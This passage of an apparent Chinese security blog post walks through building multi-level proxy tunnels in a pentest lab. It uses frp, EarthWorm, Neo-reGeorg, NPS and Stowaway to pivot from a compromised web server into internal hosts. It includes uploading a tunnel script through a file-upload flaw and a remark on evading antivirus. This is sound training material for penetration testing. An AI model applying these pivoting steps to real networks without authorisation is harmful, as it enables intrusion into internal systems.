class="hljs-attribute">plugin</span>=socks5<br>执行开启命令<br>frpc.exe -c frpc.ini<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101810242.png" srcset="/img/loading.gif" lazyload alt="image-20210805101810242"></p>
+<p>测试连接成功了</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101013784.png" srcset="/img/loading.gif" lazyload alt="image-20210805101013784"></p>
+<p>未搭建代理时，连接失败</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805102024585.png" srcset="/img/loading.gif" lazyload alt="image-20210805102024585"></p>
+<p>搭建代理后，连接成功</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805100948602.png" srcset="/img/loading.gif" lazyload alt="image-20210805100948602"></p>
+<h3 id="二级代理"><a href="#二级代理" class="headerlink" title="二级代理"></a>二级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114923729.png" srcset="/img/loading.gif" lazyload alt="image-20210805114923729"></p>
+<p>利用在win10（frps）和web服务器（frpc）搭建代理的基础上在Web服务器（frps）和内网主机1（frpc）上搭建代理，访问内网主机2</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Windows<br><span class="hljs-comment"># frps.ini</span><br>[common]<br>bind_port = 7000<br>执行开启命令<br>frps.exe -c frpc.ini<br><br>Web服务器<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 192.168.1.7 # VPS ip<br>server_port = 7000 # 与服务器端口对应<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">local_ip</span>=10.10.3.18 # 不能写127.0.0.1 反正写了就会错误<br><span class="hljs-attribute">local_port</span>=6000 # web主机被内网主机连接的端口<br><span class="hljs-attribute">remote_port</span>=6000 # 映射到VPS的端口<br><br><span class="hljs-comment"># frps.ini</span><br>[common]<br><span class="hljs-attribute">bind_addr</span>=web-ip<br>bind_port = 7000<br><br>内网主机1<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 10.10.3.18 # VPS ip<br>server_port = 7000 # 与服务器端口对应<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">remote_port</span>=6000<br><span class="hljs-attribute">plugin</span>=socks5<br><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114755986.png" srcset="/img/loading.gif" lazyload alt="image-20210805114755986"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114714780.png" srcset="/img/loading.gif" lazyload alt="image-20210805114714780"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114604466.png" srcset="/img/loading.gif" lazyload alt="image-20210805114604466"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114411169.png" srcset="/img/loading.gif" lazyload alt="image-20210805114411169"></p>
+<blockquote>
+<p>连接建立了，但是后面的代理服务器连接失败不知道具体是什么意思，但是以及可以连接内网主机了</p>
+</blockquote>
+<p>连接成功</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805114320315.png" srcset="/img/loading.gif" lazyload alt="image-20210805114320315"></p>
+<p>三级代理就类似的来即可</p>
+<h2 id="ew代理"><a href="#ew代理" class="headerlink" title="ew代理"></a>ew代理</h2><h3 id="一级代理-1"><a href="#一级代理-1" class="headerlink" title="一级代理"></a>一级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805130313193.png" srcset="/img/loading.gif" lazyload alt="image-20210805130313193"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10：ew_for_win_32.exe -s rcsocks -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>Web服务器：ew_for_win_32.exe -s rssocks -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805131042550.png" srcset="/img/loading.gif" lazyload alt="image-20210805131042550"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805130844477.png" srcset="/img/loading.gif" lazyload alt="image-20210805130844477"></p>
+<p>连接内网主机成功</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805131203118.png" srcset="/img/loading.gif" lazyload alt="image-20210805131203118"></p>
+<h3 id="二级代理-1"><a href="#二级代理-1" class="headerlink" title="二级代理"></a>二级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805133050867.png" srcset="/img/loading.gif" lazyload alt="image-20210805133050867"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10：ew_for_Win.exe -s lcx_listen -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>内网主机<span class="hljs-number">1</span>：ew_for_Win.exe -s ssocksd -l <span class="hljs-number">9000</span><br>Web服务器：ew_for_Win.exe -s lcx_slave -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span> -f <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.131</span> -g <span class="hljs-number">9000</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132433015.png" srcset="/img/loading.gif" lazyload alt="image-20210805132433015"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132401981.png" srcset="/img/loading.gif" lazyload alt="image-20210805132401981"></p>
+<p>隧道搭建成功</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132209244.png" srcset="/img/loading.gif" lazyload alt="image-20210805132209244"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805132241110.png" srcset="/img/loading.gif" lazyload alt="image-20210805132241110"></p>
+<blockquote>
+<p>连接时工具会突然停止运行，具体原因不清楚</p>
+</blockquote>
+<h3 id="三级代理"><a href="#三级代理" class="headerlink" title="三级代理"></a>三级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805135020239.png" srcset="/img/loading.gif" lazyload alt="image-20210805135020239"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Win10：ew_for_Win.exe -s rcsocks -l <span class="hljs-number">6000</span> -e <span class="hljs-number">8000</span><br>Web服务器：ew_for_Win.exe -s lcx_slave -d <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -e <span class="hljs-number">8000</span> -f <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.131</span> -g <span class="hljs-number">9000</span><br>内网主机<span class="hljs-number">1</span>：ew_for_Win.exe -s lcx_listen -l <span class="hljs-number">9000</span> -e <span class="hljs-number">7000</span><br>内网主机<span class="hljs-number">2</span>：ew_for_Win.exe -s rssocks -d <span class="hljs-number">10.10</span><span class="hljs-number">.21</span><span class="hljs-number">.128</span> -e <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>隧道的级数越大所连接需要的时间就越长了</p>
+</blockquote>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140125688.png" srcset="/img/loading.gif" lazyload alt="image-20210805140125688"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140156398.png" srcset="/img/loading.gif" lazyload alt="image-20210805140156398"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140253519.png" srcset="/img/loading.gif" lazyload alt="image-20210805140253519"></p>
+<p>连接成功</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805140008622.png" srcset="/img/loading.gif" lazyload alt="image-20210805140008622"></p>
+<blockquote>
+<p>工具感觉还是容易被杀毒软件杀掉，还是需要自己去编写，或者自己做好免杀处理</p>
+</blockquote>
+<h2 id="Neo-reGeory"><a href="#Neo-reGeory" class="headerlink" title="Neo-reGeory"></a>Neo-reGeory</h2><blockquote>
+<p>建立HTTP隧道的工具，适用于目标服务器只开放了80端口，通过80端口去探测内网服务器。（利用文件上传漏洞即可）</p>
+</blockquote>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
+<p>参考连接</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/110389330">https://blog.csdn.net/qq_32393893/article/details/110389330</a></p>
+<p>运行命令生成后面文件：<code>python neoreg.py generate -k lcdm123 </code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806093956906.png" srcset="/img/loading.gif" lazyload alt="image-20210806093956906"></p>
+<p>上传服务器支持的对应文件</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094624888.png" srcset="/img/loading.gif" lazyload alt="image-20210806094624888"></p>
+<blockquote>
+<p>测试文件在线</p>
+</blockquote>
+<p>上传后本地搭建连接：<code>python neoreg.py -k lcdm123 -u http://web-ip/tunnel.php -p 6000</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094746686.png" srcset="/img/loading.gif" lazyload alt="image-20210806094746686"></p>
+<p>测试连接代理</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806094918799.png" srcset="/img/loading.gif" lazyload alt="image-20210806094918799"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210806095050984.png" srcset="/img/loading.gif" lazyload alt="image-20210806095050984"></p>
+<p>成功了</p>
+<h2 id="NPC-amp-NPS"><a href="#NPC-amp-NPS" class="headerlink" title="NPC&amp;NPS"></a>NPC&amp;NPS</h2><p><a target="_blank" rel="noopener" href="https://aquilao.github.io/Blog/NPS/">https://aquilao.github.io/Blog/NPS/</a></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210907145149529.png" srcset="/img/loading.gif" lazyload alt="image-20210907145149529"></p>
+<p>这个的运行是身份简单的，由 NPS 生成一个 web 服务端，然后将 npc上传到靶机上按照 web 服务端给出的命令执行即可</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># NPS 配置  编辑 conf/nps.conf</span><br><span class="hljs-comment">#web</span><br>web_host=192.168.1.15  <span class="hljs-comment"># 服务器的ip</span><br>web_username=admin  <span class="hljs-comment"># 登录用户名</span><br>web_password=admin  <span class="hljs-comment"># 登录密码</span><br>web_port = 8080   <span class="hljs-comment"># web端口</span><br><br>将工具上传到了服务器后，如果是第一此执行则需要运行  sudo ./nps install<br>开启nps  nps start<br>./nps test|<span class="hljs-string">start</span>|<span class="hljs-string">stop</span>|<span class="hljs-string">restart</span>|<span class="hljs-string">status  测试配置文件</span>|<span class="hljs-string">启动</span>|<span class="hljs-string">停止</span>|<span class="hljs-string">重启</span>|<span class="hljs-string">状态</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210907150908264.png" srcset="/img/loading.gif" lazyload alt="image-20210907150908264"></p>
+<blockquote>
+<p>登录到 web 端，然后点击客户端，使用新增，之后就会有连接的命令，只需要把 npc 的传入靶机运行即可</p>
+</blockquote>
+<h2 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h2><p><a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p>
+<blockquote>
+<p>比较新款的使用 go 编写的内网代理工具，星链计划推荐，应该会持续更新</p>
+</blockquote>
+<ul>
+<li><code>admin</code> 渗透测试者使用的主控端</li>
+<li><code>agent</code> 渗透测试者部署的被控端</li>
+</ul>
+<p><strong>Admin</strong></p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml">参数:<br>-<span class="ruby">l 被动模式下的监听地址[ip]<span class="hljs-symbol">:&lt;port&gt;</span></span><br><span class="ruby">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br><span class="ruby">-c 主动模式下的目标节点地址</span><br><span class="ruby">--proxy socks5代理服务器地址</span><br><span class="ruby">--proxyu socks5代理服务器用户名(可选)</span><br><span class="ruby">--proxyp socks5代理服务器密码(可选)</span><br><span class="ruby">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>Agent</strong></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">参数:<br>-l 被动模式下的监听地址[ip]:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span></span><br>-s 节点通信加密密钥<br>-c 主动模式下的目标节点地址<br>--proxy socks5代理服务器地址<br>--proxyu socks5代理服务器用户名(可选)<br>--proxyp socks5代理服务器密码(可选)<br>--reconnect 重连时间间隔<br>--rehost 端口复用时复用的IP地址<br>--report 端口复用时复用的端口号<br>--up 上游协议类型,默认为裸TCP流量,可选HTTP<br>--down 下游协议类型,默认为裸TCP流量,可选HTTP<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>功能太多，使用步骤好复杂呀:cry:</p>
+</blockquote>
+<h3 id="一级代理-2"><a href="#一级代理-2" class="headerlink" title="一级代理"></a>一级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917140954098.png" srcset="/img/loading.gif" lazyload alt="image-20210917140954098"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">win10：windows_x86_admin.exe -l <span class="hljs-number">9000</span> -s password <br>web服务器: windows_x86_agent.exe -c <span class="hljs-number">192.168</span><span class="hljs-number">.44</span><span class="hljs-number">.1</span>:<span class="hljs-number">9000</span> -reconnect <span class="hljs-number">5</span><br># 这样两台电脑就建立了连接了<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143113458.png" srcset="/img/loading.gif" lazyload alt="image-20210917143113458"></p>
+<p>使用ssh 连接内网主机</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143151144.png" srcset="/img/loading.gif" lazyload alt="image-20210917143151144"></p>
+<p>开启 socks5 代理通道</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917143228545.png" srcset="/img/loading.gif" lazyload alt="image-20210917143228545"></p>
+<blockquote>
+<p>可以使用 stopsocks 停止</p>
+</blockquote>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917142735471.png" srcset="/img/loading.gif" lazyload alt="image-20210917142735471"></p>
+<blockquote>
+<p>一级代理的搭建就是这么简单</p>
+</blockquote>
+<h3 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a>多级代理</h3><blockquote>
+<p>现在一级代理搭建好后，可以直接准备二级代理、</p>
+</blockquote>
+<p>使用 admin 在相应的节点建立监听</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152142891.png" srcset="/img/loading.gif" lazyload alt="image-20210917152142891"></p>
+<p>然后在内网主机执行连接操作</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152234610.png" srcset="/img/loading.gif" lazyload alt="image-20210917152234610"></p>
+<p>之后就会连接成功了</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152258505.png" srcset="/img/loading.gif" lazyload alt="image-20210917152258505"></p>
+<blockquote>
+<p>这里使用 connect 命令连接不上，具体原因暂时不清楚</p>
+<p>操作步骤：内网靶机设置监听  -l  ；admin 执行 connect 操作连接主机响应端口</p>
+</blockquote>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210917152624930.png" srcset="/img/loading.gif" lazyload alt="image-20210917152624930"></p>
+<blockquote>
+<p>工具基础操作其实也并不难，就是体积有点大，多级代理的操作就类似</p>
+</blockquote>
+<h3 id="命令解释"><a href="#命令解释" class="headerlink" title="命令解释"></a>命令解释</h3><ul>
+<li><p>命令 agent 监听某个端口并等待子节点的接入：<code>listen</code></p>
+<blockquote>
+<ol>
+<li><code>Normal passive</code>：agent 将会以普通的方式监听目标端口，并等待子节点接入</li>
+<li><code>IPTables Reuse</code>：agetnt 将以 IPTable Reuse 的方式复用端口，并等待子节点接入</li>
+<li><code>SOReuse</code>：agent 将会以 SOReuse 的方式复用端口，并等待子节点接入</li>
+</ol>
+<p><code>listen</code>  一次只能接受一个子节点，若需要多个子节点连入，需要多次执行</p>
+</blockquote>
+</li>
+<li><p>使用 ssh 连接目标机器：<code>ssh ip:port</code></p>
+</li>
+<li><p>获取当前节点的 shll：<code>shell</code></p>
+</li>
+<li><p>在当前节点启动 socks5 服务：<code>socks port</code></p>
+</li>
+<li><p>停止 socks5 服务：<code>stopsocks</code></p>
+</li>
+<li><p>命令当前节点连接另一个子节点：<code>connect ip:port </code></p>
+<blockquote>
+<p>具体使用参照上面的多级代理</p>
+</blockquote>
+</li>
+<li><p>命令当前节点以 ssh 隧道的方法连接另一个子节点：<code>sshtunnel ip:22 port</code></p>
+<blockquote>
+<p>具体使用和 connect 类似</p>
+</blockquote>
+</li>
+<li><p>上传文件，选择好相应节点  <code>upload filename </code></p>
+</li>
+<li><p>下载文件，选择好相应节点 <code>download filename</code></p>
+</li>
+<li><p>返回到主 panel：<code>back</code></p>
+</li>
+<li><p>映射 admin 上的端口到远程端口：<code>forward 9000 127.0.0.1:22</code></p>
+</li>
+<li><p>关闭当前节点的远程映射：<code>stopforward</code></p>
+</li>
+<li><p>反向映射当前端 agent 端口到 admin 的本地端口： <code>backward 9001 22</code></p>
+</li>
+<li><p>关闭当前节点的反向映射：<code>stopbackward</code></p>
+</li>
+<li><p>命令当前节点下线：<code>shutdown</code></p>
+</li>
+</ul>
+<h2 id="其他工具搭建隧道"><a href="#其他工具搭建隧道" class="headerlink" title="其他工具搭建隧道"></a>其他工具搭建隧道</h2><p><a target="_blank" rel="noopener" href="https://v0w.top/2020/08/11/IntranetProxy/">https://v0w.top/2020/08/11/IntranetProxy/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">红日靶场一</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/">
+                        <span class="hidden-mobile">内网渗透知识点</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
